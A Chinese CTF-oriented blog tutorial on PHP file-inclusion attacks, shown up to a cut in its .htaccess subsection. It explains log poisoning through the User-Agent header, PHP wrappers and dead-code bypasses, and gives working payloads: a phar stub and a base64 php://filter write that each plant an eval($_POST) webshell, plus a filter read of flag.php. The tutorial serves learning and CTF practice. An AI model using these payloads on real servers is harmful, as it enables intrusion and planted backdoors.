
<!DOCTYPE html>
<html lang="zh-CN">

<head>
  <meta charset="UTF-8" />
  <title>PHP文件包含总结 Re:Master | 雲流のLowest World</title>
  <meta name="author" content="C1oudfL0w0" />
  <meta name="description" content="" />
  <meta name="keywords" content="" />
  <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
  <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
  <!-- cdn挂掉的时候要可以引用本地 -->
<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
<script src="/blog/js/vue.global.prod.min.js"></script>


<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />


<link rel="stylesheet" href="/blog/css/all.min.css" />
<link rel="stylesheet" href="/blog/css/fonts.min.css" />
<link rel="stylesheet" href="/blog/css/search.css" />
<script> const mixins = {}; </script>


<!--改成了prismjs高亮-->

<script src="/blog/js/lib/prism.js"></script>
<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />



<script src="/blog/js/lib/preview.js"></script>










<script src="/blog/js/lib/home.js"></script>

<link rel="stylesheet" href="/blog/css/main.css" />
<!-- 引入不蒜子-->

<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<script type="text/javascript" src="/blog/js/lib/codeBlock/codeBlockFuction.js"></script>
<!-- 代码语言 -->
<script type="text/javascript" src="/blog/js/lib/codeBlock/codeLang.js"></script>
<!-- 代码块复制 -->
<!-- 引入clipboard -->

<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>

<script type="text/javascript" src="/blog/js/lib/codeBlock/codeCopy.js"></script>
<!-- 代码块收缩 -->
<script type="text/javascript" src="/blog/js/lib/codeBlock/codeShrink.js"></script> 
<!-- 代码块折行 -->
<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="雲流のLowest World" type="application/atom+xml">
</head>

<body>
  <!--flag{never_g0nna g1ve_you up}-->

  <!-- 页面点击特效 -->
  <script type="text/javascript" src="/blog/js/love-click.js"></script>

  <!-- 浏览器标题 -->
  <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>

  <!-- 动态背景 -->
  

  <!--文章目录-->
  
    <div id="toc" class="toc-article">
    <h3><i class="fas fa-stream"></i>  目录</h3>
      <div class="toc-title"></div>
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.</span> <span class="toc-text">PHP文件包含</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#include%E7%B3%BB%E5%88%97%E5%87%BD%E6%95%B0"><span class="toc-number">2.</span> <span class="toc-text">include系列函数</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#LFI-%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB"><span class="toc-number">2.1.</span> <span class="toc-text">LFI_日志包含</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nginx"><span class="toc-number">2.1.1.</span> <span class="toc-text">Nginx</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Apache"><span class="toc-number">2.1.2.</span> <span class="toc-text">Apache</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8C%85%E5%90%ABphar%E5%8C%85%E4%B8%BAphp%E8%84%9A%E6%9C%AC"><span class="toc-number">2.2.</span> <span class="toc-text">包含phar包为php脚本</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%B8%8Ewrapper"><span class="toc-number">3.</span> <span class="toc-text">PHP伪协议与wrapper</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%87%BD%E6%95%B0"><span class="toc-number">4.</span> <span class="toc-text">文件系统函数</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#file-get-contents"><span class="toc-number">4.1.</span> <span class="toc-text">file_get_contents</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#file-put-contents"><span class="toc-number">4.2.</span> <span class="toc-text">file_put_contents</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%AD%BB%E4%BA%A1%E4%BB%A3%E7%A0%81"><span class="toc-number">4.2.1.</span> <span class="toc-text">绕过死亡代码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">5.</span> <span class="toc-text">Session文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#session%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B"><span class="toc-number">5.1.</span> <span class="toc-text">session工作流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">5.2.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#session-upload-progress"><span class="toc-number">5.3.</span> <span class="toc-text">session.upload_progress</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#session%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="toc-number">5.4.</span> <span class="toc-text">session条件竞争</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88RFI%EF%BC%89"><span class="toc-number">6.</span> <span class="toc-text">远程文件包含漏洞（RFI）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1"><span class="toc-number">7.</span> <span class="toc-text">防御</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pearcmd"><span class="toc-number">8.</span> <span class="toc-text">Pearcmd</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Docker-PHP%E8%A3%B8%E6%96%87%E4%BB%B6%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB"><span class="toc-number">9.</span> <span class="toc-text">Docker PHP裸文件本地包含</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#phpinfo-amp-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%B3%95"><span class="toc-number">9.1.</span> <span class="toc-text">phpinfo&amp;条件竞争法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#FilterChain"><span class="toc-number">10.</span> <span class="toc-text">FilterChain</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#The-End-of-LFI"><span class="toc-number">10.1.</span> <span class="toc-text">The End of LFI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#file-read-from-error-based-oracle"><span class="toc-number">10.2.</span> <span class="toc-text">file read from error-based oracle</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cnext-CVE-2024-2961"><span class="toc-number">10.3.</span> <span class="toc-text">cnext (CVE-2024-2961)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Opcache%E7%BC%93%E5%AD%98"><span class="toc-number">11.</span> <span class="toc-text">Opcache缓存</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#open-basedir-%E7%BB%95%E8%BF%87"><span class="toc-number">12.</span> <span class="toc-text">open_basedir 绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#FastCGI-amp-php-fpm"><span class="toc-number">12.1.</span> <span class="toc-text">FastCGI&amp;php-fpm</span></a></li></ol></li></ol>
    </div>
    <script>
    (function () {
        function initTocHighlight() {
            var tocLinks = document.querySelectorAll('#toc .toc-link');
            if (!tocLinks.length) return;

            // 收集所有标题锚点对应的 DOM 元素
            var headings = [];
            tocLinks.forEach(function (link) {
                var href = link.getAttribute('href');
                if (!href) return;
                var id = decodeURIComponent(href.slice(1));
                var el = document.getElementById(id);
                if (el) headings.push({ el: el, link: link });
            });
            if (!headings.length) return;

            var activeLink = null;
            var offset = 80;

            function highlight() {
                var scrollTop = window.pageYOffset || document.documentElement.scrollTop;
                var current = null;

                for (var i = 0; i < headings.length; i++) {
                    if (headings[i].el.getBoundingClientRect().top <= offset + 10) {
                        current = headings[i];
                    }
                }

                // 仅在用户确实滚动过、且到达页面底部时，才强制高亮最后一个
                if (scrollTop > 100 && window.innerHeight + scrollTop >= document.documentElement.scrollHeight - 50) {
                    current = headings[headings.length - 1];
                }

                // 页面顶部且没有标题进入视口时，高亮第一个
                if (scrollTop == 0) {
                    current = headings[0];
                }

                if (current && current.link !== activeLink) {
                    // 清除所有高亮
                    tocLinks.forEach(function (link) {
                        link.classList.remove('toc-active');
                    });

                    // 高亮当前项
                    current.link.classList.add('toc-active');
                    activeLink = current.link;

                    // TOC 容器自动滚动，使当前项可见
                    var tocEl = document.getElementById('toc');
                    var linkRect = activeLink.getBoundingClientRect();
                    var tocRect = tocEl.getBoundingClientRect();
                    if (linkRect.top < tocRect.top || linkRect.bottom > tocRect.bottom) {
                        activeLink.scrollIntoView({ block: 'center', behavior: 'smooth' });
                    }
                } else if (!current && activeLink) {
                    tocLinks.forEach(function (link) {
                        link.classList.remove('toc-active');
                    });
                    activeLink = null;
                }
            }

            var ticking = false;
            window.addEventListener('scroll', function () {
                if (!ticking) {
                    requestAnimationFrame(function () {
                        highlight();
                        ticking = false;
                    });
                    ticking = true;
                }
            });

            // 初始高亮
            highlight();
        }

        // 等待页面完全加载后再初始化（确保文章标题 DOM 已渲染）
        if (document.readyState === 'complete') {
            initTocHighlight();
        } else {
            window.addEventListener('load', initTocHighlight);
        }
    })();
    </script>
  

  <!--返回顶部-->
  <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
    <a title="返回顶部">↑</a>
  </div>
  <script src="/blog/js/totop.js"></script>

  <div id="layout">
    
    <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
    
    <transition name="fade">
      <div id="loading" v-show="loading">
        <div id="loading-circle">
          <h2>LOADING</h2>
          <p>第一次加载文章图片可能会花费较长时间</p>
          <p>要不挂个梯子试试？（x</p>
          <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
          <img src="/blog/images/loading.gif" />
        </div>
      </div>
    </transition>
    <transition name="into">
      <div id="main" v-show="!loading">
        <nav id="menu" ref="menu">
    <div class="desktop-menu">
        <a class="title" href="/blog/">
            <span>雲流のLOWEST WORLD</span>
        </a>
        
        <a href="/blog/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/blog/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;About</span>
        </a>
        
        <a href="/blog/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/blog/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;Categories</span>
        </a>
        
        <a href="/blog/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
        <a href="/blog/links">
            <i class="fa-solid fa-link fa-fw"></i>
            <span>&ensp;Links</span>
        </a>
        
        <a href="/blog/search">
            <i class="fa-solid fa-search fa-fw"></i>
            <span>&ensp;Search</span>
        </a>
        
    </div>
    <div id="mobile-menu">
        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
        <div class="title" @click="showMenu = !showMenu">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;雲流のLOWEST WORLD</span>
        </div>
        <transition name="slide">
        <div class="items" v-show="showMenu">
            
            <a href="/blog/">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-house fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                </div>
            </a>
            
            <a href="/blog/about">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-id-card fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
                </div>
            </a>
            
            <a href="/blog/archives">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-box-archive fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                </div>
            </a>
            
            <a href="/blog/categories">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-bookmark fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
                </div>
            </a>
            
            <a href="/blog/tags">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-tags fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                </div>
            </a>
            
            <a href="/blog/links">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-link fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
                </div>
            </a>
            
            <a href="/blog/search">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-search fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
                </div>
            </a>
            
        </div>
        </transition>
    </div>
</nav>

        <div class="article">
    <div>
        <h1>PHP文件包含总结 Re:Master</h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2023/3/15
        </span>
        
        <span class="category">
            <a href="/blog/categories/Web/">
                <span class="icon">
                    <i class="fa-solid fa-bookmark fa-fw"></i>
                </span>
                Web
            </a>
        </span>
        
        
        <span class="tags">
            <span class="icon">
                <i class="fa-solid fa-tags fa-fw"></i>
            </span>
            
            <span class="tag">
                
                <a href="/blog/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="color: #00a596">文件包含</a>
            </span>
            
            <span class="tag">
                
                <a href="/blog/tags/PHP/" style="color: #ffa2c4">PHP</a>
            </span>
            
        </span>
        
        <!--文章字数统计-->
        
            
<div style="margin-top:10px;">
    <span class="post-time">
      <span class="post-meta-item-icon">
        <i class="fa fa-keyboard-o"></i>
        <span class="post-meta-item-text">  字数统计: </span>
        <!-- 安装插件npm install hexo-wordcount --save -->
        <span class="post-count">8.6k字</span>
      </span>
    </span>

    <span class="post-time">
      &nbsp; | &nbsp;
      <span class="post-meta-item-icon">
        <i class="fa fa-hourglass-half"></i>
        <span class="post-meta-item-text">  阅读时长: </span>
        <span class="post-count">46分</span>
      </span>
    </span>
    
    <!--不蒜子统计访问数-->
    <span id="busuanzi_container_page_pv">
    &nbsp; | &nbsp;
    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
    </span>
</div>

          
    </div>
    
    <div class="content" v-pre>
        <h1 id="PHP文件包含"><a href="#PHP文件包含" class="headerlink" title="PHP文件包含"></a>PHP文件包含</h1><p><a target="_blank" rel="noopener" href="https://github.com/ProbiusOfficial/PHPinclude-labs">https://github.com/ProbiusOfficial/PHPinclude-labs</a></p>
<p>内容：</p>
<ul>
<li>include系列包含，LFI（本地文件包含），RFI（远程文件包含）</li>
<li>文件系统函数</li>
<li>PHP伪协议与包装器</li>
<li>特殊的包含姿势</li>
<li>文件包含 &#x3D; RCE？</li>
</ul>
<span id="more"></span>

<hr>
<h1 id="include系列函数"><a href="#include系列函数" class="headerlink" title="include系列函数"></a>include系列函数</h1><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.include.php">https://www.php.net/manual/zh/function.include.php</a></p>
<p><code>include()</code>:包含一个文件，如错误则抛出警告</p>
<p><code>include_once()</code>:包含一个文件仅一次，和上面类似</p>
<p><code>require()</code>:包含一个文件，如错误则报错并停止脚本</p>
<p><code>require_once()</code>:包含一个文件仅一次，和上面类似</p>
<p><strong>任何类型</strong>的文件，只要其中含有合法PHP代码，include 就可以包含并执行；如果没有，就会以纯文本形式显示文件中的内容</p>
<hr>
<h2 id="LFI-日志包含"><a href="#LFI-日志包含" class="headerlink" title="LFI_日志包含"></a>LFI_日志包含</h2><p>前面提到，include 可以包含任何类型的文件，只需要其中有合法的 PHP 代码就能将其解析为 PHP 脚本</p>
<p>而日志文件会记录我们每一次请求，如果我们在请求中直接插入 PHP 代码被日志记录下来，那么可以尝试包含日志来执行我们的 PHP 代码</p>
<p>日志文件的位置更多情况下需要自己猜或根本没有，或者通过 phpinfo 环境变量获取，一些框架可以通过debug模式报错获取日志位置</p>
<h3 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h3><p>默认位置：&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p>
<p>Nginx 的日志格式为</p>
<pre class="line-numbers language-nginx" data-language="nginx"><code class="language-nginx"><span class="token directive"><span class="token keyword">log_format</span> access <span class="token string">'<span class="token variable">$remote_addr</span> – <span class="token variable">$remote_user</span> [<span class="token variable">$time_local]</span> "<span class="token variable">$request</span>"'</span> <span class="token string">'<span class="token variable">$status</span> <span class="token variable">$body_bytes_sent</span> "<span class="token variable">$http_referer</span>"'</span> <span class="token string">'"<span class="token variable">$http_user_agent</span>" <span class="token variable">$http_x_forwarded_for</span>'</span></span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>那么，我们可以在其中的 User-Agent 请求头中注入我们的 PHP 代码，然后 include 日志文件即可执行</p>
<p>同样的，referer、xff头都是我们可以注入的地方</p>
<br>

<p>相关题目：ctfshow web150</p>
<p><img src="/blog/2023/03/15/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20230718120031429.png" alt="image-20230718120031429"></p>
<h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h3><p>默认位置：&#x2F;var&#x2F;log&#x2F;apache2&#x2F;</p>
<ul>
<li><p><strong>access.log</strong></p>
<p>记录网站的访问信息，包括user-agent头的信息，</p>
<p><code>客户端IP - - [访问时间] &quot;请求记录&quot; HTTP状态码 字节数</code></p>
</li>
<li><p><strong>error.log</strong></p>
<p>记录错误的访问信息</p>
</li>
</ul>
<p>注：</p>
<p>由于每次的日志会追加记录不会覆盖前面的记录，所以，如果一开始构造的php代码有问题会产生报错或者不执行的情况，就必须重启容器。</p>
<p>日志包含往往需要发送两次包，这是因为发送第一个包的时候，将一句话木马写入日志，第二次发包才会包含到前一次的日志中的木马</p>
<hr>
<h2 id="包含phar包为php脚本"><a href="#包含phar包为php脚本" class="headerlink" title="包含phar包为php脚本"></a>包含phar包为php脚本</h2><p>最新最热： <a target="_blank" rel="noopener" href="https://fushuling.com/index.php/2025/07/30/%e5%bd%93include%e9%82%82%e9%80%85phar-deadsecctf2025-baby-web/">https://fushuling.com/index.php/2025/07/30/%e5%bd%93include%e9%82%82%e9%80%85phar-deadsecctf2025-baby-web/</a></p>
<p>一些值得注意的点：</p>
<p>gzip、bzip2、zip、tar格式均可以为 phar 的文件容器</p>
<table>
<thead>
<tr>
<th>文件结构</th>
<th>特殊处理</th>
</tr>
</thead>
<tbody><tr>
<td>纯 PHP 脚本（有<code>_HALT_COMPILER();</code> ）</td>
<td>默认支持</td>
</tr>
<tr>
<td>gzip压缩的Phar</td>
<td>需要解压</td>
</tr>
<tr>
<td>bzip2压缩的Phar</td>
<td>需要解压</td>
</tr>
<tr>
<td>tar格式的打包</td>
<td><code>.phar.tar</code> 或 <code>.tar.phar</code></td>
</tr>
<tr>
<td>zip格式的打包</td>
<td><code>.phar.zip</code> 或 <code>.zip.phar</code></td>
</tr>
</tbody></table>
<p>构造phar包：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'exploit.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$stub</span> <span class="token operator">=</span> <span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span><span class="token string single-quoted-string">'STUB'</span>
<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token class-name type-declaration">php</span>
    <span class="token variable">$a</span><span class="token operator">=</span><span class="token string double-quoted-string">"&lt;?php eval(\$_POST[0]);"</span><span class="token punctuation">;</span>
    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/var/www/html/2.php"</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">__HALT_COMPILER</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span>
STUB;
$phar->setStub($stub);
$phar->addFromString('test.txt', 'test');
$phar->stopBuffering();
?><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可对 phar 包进行 gzip 压缩去除明文字符特征</p>
<hr>
<h1 id="PHP伪协议与wrapper"><a href="#PHP伪协议与wrapper" class="headerlink" title="PHP伪协议与wrapper"></a>PHP伪协议与wrapper</h1><p><a href="/blog/2023/03/15/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/">PHP伪协议</a></p>
<p>PHP支持的封装协议：<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.php">https://www.php.net/manual/zh/wrappers.php</a></p>
<table>
<thead>
<tr>
<th>协议</th>
<th>allow_url_fopen</th>
<th>allow_url_include</th>
</tr>
</thead>
<tbody><tr>
<td>file:&#x2F;&#x2F;</td>
<td></td>
<td></td>
</tr>
<tr>
<td>http:&#x2F;&#x2F;</td>
<td>On</td>
<td>On</td>
</tr>
<tr>
<td>ftp:&#x2F;&#x2F;</td>
<td></td>
<td></td>
</tr>
<tr>
<td>php:&#x2F;&#x2F;</td>
<td></td>
<td>php:&#x2F;&#x2F;input需要为On</td>
</tr>
<tr>
<td>zlib:&#x2F;&#x2F;</td>
<td></td>
<td></td>
</tr>
<tr>
<td>data:&#x2F;&#x2F;</td>
<td>On</td>
<td>On</td>
</tr>
<tr>
<td>glob:&#x2F;&#x2F;</td>
<td></td>
<td></td>
</tr>
<tr>
<td>phar:&#x2F;&#x2F;</td>
<td></td>
<td></td>
</tr>
<tr>
<td>ssh2:&#x2F;&#x2F;</td>
<td></td>
<td></td>
</tr>
<tr>
<td>rar:&#x2F;&#x2F;</td>
<td></td>
<td></td>
</tr>
<tr>
<td>ogg:&#x2F;&#x2F;</td>
<td></td>
<td></td>
</tr>
<tr>
<td>expect:&#x2F;&#x2F;</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<hr>
<h1 id="文件系统函数"><a href="#文件系统函数" class="headerlink" title="文件系统函数"></a>文件系统函数</h1><p>除开直接的文本包含，更多的会考察一些对封装协议(wrappers)的运用，那么文件系统函数就十分常见</p>
<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/ref.filesystem.php">https://www.php.net/manual/zh/ref.filesystem.php</a></p>
<h2 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents"></a>file_get_contents</h2><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.file-get-contents.php">https://www.php.net/manual/zh/function.file-get-contents.php</a></p>
<p>将整个文件读入一个字符串</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">file_get_contents</span><span class="token punctuation">(</span>
    <span class="token keyword type-hint">string</span> <span class="token variable">$filename</span><span class="token punctuation">,</span>
    <span class="token keyword type-hint">bool</span> <span class="token variable">$use_include_path</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">,</span>
    <span class="token operator">?</span><span class="token class-name type-declaration">resource</span> <span class="token variable">$context</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">,</span>
    <span class="token keyword type-hint">int</span> <span class="token variable">$offset</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>
    <span class="token operator">?</span><span class="token keyword type-hint">int</span> <span class="token variable">$length</span> <span class="token operator">=</span> <span class="token constant">null</span>
<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>往往可以在 filename 参数上使用各种封装协议，如：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://filter/read=convert.base64-encode/resource=flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'phar://phpinfo.zip/phpinfo.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>



<hr>
<h2 id="file-put-contents"><a href="#file-put-contents" class="headerlink" title="file_put_contents"></a>file_put_contents</h2><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.file-put-contents.php">https://www.php.net/manual/zh/function.file-put-contents.php</a></p>
<p>将数据写入文件</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">file_put_contents</span><span class="token punctuation">(</span>
    <span class="token keyword type-hint">string</span> <span class="token variable">$filename</span><span class="token punctuation">,</span>
    <span class="token keyword type-hint">mixed</span> <span class="token variable">$data</span><span class="token punctuation">,</span>
    <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>
    <span class="token operator">?</span><span class="token class-name type-declaration">resource</span> <span class="token variable">$context</span> <span class="token operator">=</span> <span class="token constant">null</span>
<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">int</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>对于 file_put_contents，php:&#x2F;&#x2F;filter 封装协议的运用相较前面有所变化</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://filter/write=convert.base64-decode/resource=1.php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'PD9waHAgZXZhbCgkX1BPU1RbMF0pOw=='</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>此处为 write，且要被解码的 data 位置在 content</p>
<h3 id="绕过死亡代码"><a href="#绕过死亡代码" class="headerlink" title="绕过死亡代码"></a>绕过死亡代码</h3><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8163#toc-3">https://xz.aliyun.com/t/8163#toc-3</a></p>
<blockquote>
<p>题目</p>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">1. file_put_contents($filename,"&lt;?php exit();".$content);
2. file_put_contents($content,"&lt;?php exit();".$content);
3. file_put_contents($filename,$content . "\nxxxxxx");<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<ul>
<li><strong>base64编码绕过</strong></li>
</ul>
<p>利用base64解码，将死亡代码解码成乱码，使得php引擎无法识别</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$filename</span><span class="token operator">=</span><span class="token string single-quoted-string">'php://filter/write=convert.base64-decode/resource=1.php'</span><span class="token punctuation">;</span>
<span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'aPD9waHAgcGhwaW5mbygpOz8+'</span><span class="token punctuation">;</span>

<span class="token variable">$content</span>加了一个a，是因为base64在解码的时候是将<span class="token number">4</span>个字节转化为<span class="token number">3</span>个字节，又因为死亡代码只有phpexit<span class="token operator">/</span>phpdie参与了解码，所以补上一位就可以完全转化<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li><p><strong>rot13编码绕过</strong></p>
<p>原理和base64一样，可以直接转码分解死亡代码</p>
</li>
</ul>
<blockquote>
<p>注：因为我们生成的文件内容之中前面的<code>&lt;?</code>并没有分解掉，这时，如果服务器开启了短标签，那么就会被解析，所以所以后面的代码就会错误；也就失去了作用</p>
</blockquote>
<ul>
<li><p><strong>.htaccess的预包含利用</strong></p>
<p>利用 .htaccess的预包含文件的功能来进行攻破；自定义包含我们的flag文件</p>
</li>
</ul>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$filename</span><span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/write=string.strip_tags/resource=.htaccess</span>

